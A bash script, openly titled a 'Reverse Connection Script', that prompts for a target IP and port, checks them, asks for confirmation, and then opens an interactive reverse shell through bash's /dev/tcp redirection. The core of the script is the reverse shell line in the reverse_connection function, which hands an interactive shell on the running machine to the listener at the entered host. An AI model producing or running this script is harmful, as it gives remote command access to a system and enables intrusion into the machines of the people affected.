#!/usr/bin/env bash

# Enable strict mode
# Set IFS (safer word splitting)
set -euo pipefail
IFS=$'\n\t'

# Maximum number of parallel jobs (e.g., number of CPU cores)
MAX_JOBS="$(nproc)"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Print colored messages
print_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Validate IP address format
validate_ip() {
    local ip=$1
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        local IFS='.'
        local -a octets=($ip)
        for octet in "${octets[@]}"; do
            if ((octet > 255)); then
                return 1
            fi
        done
        return 0
    else
        return 1
    fi
}

# Validate port number
validate_port() {
    local port=$1
    if [[ $port =~ ^[0-9]+$ ]] && ((port >= 1 && port <= 65535)); then
        return 0
    else
        return 1
    fi
}

# Get user input for target IP and port
get_connection_params() {
    local target_ip=""
    local target_port=""

    # Get IP address
    while true; do
        read -rp "Enter target IP address: " target_ip
        if validate_ip "$target_ip"; then
            break
        else
            print_error "Invalid IP address format. Please try again."
        fi
    done

    # Get port number
    while true; do
        read -rp "Enter target port number (1-65535): " target_port
        if validate_port "$target_port"; then
            break
        else
            print_error "Invalid port number. Must be between 1 and 65535."
        fi
    done

    # Confirm before proceeding
    print_warning "About to connect to: ${target_ip}:${target_port}"
    read -rp "Continue? (y/N): " confirm
    if [[ ! $confirm =~ ^[Yy]$ ]]; then
        print_info "Operation cancelled."
        exit 0
    fi

    echo "$target_ip $target_port"
}

# Establish reverse connection with user-provided parameters
reverse_connection() {
    local params
    params=$(get_connection_params)
    read -r target_ip target_port <<< "$params"

    print_info "Initiating connection to ${target_ip}:${target_port}..."

    # Attempt reverse shell connection
    if bash -i >& "/dev/tcp/${target_ip}/${target_port}" 0>&1; then
        print_info "Connection established successfully."
    else
        print_error "Failed to establish connection."
        exit 1
    fi
}

# Main function
main() {
    print_info "Reverse Connection Script"
    print_info "Maximum parallel jobs: ${MAX_JOBS}"
    echo

    reverse_connection
}

main
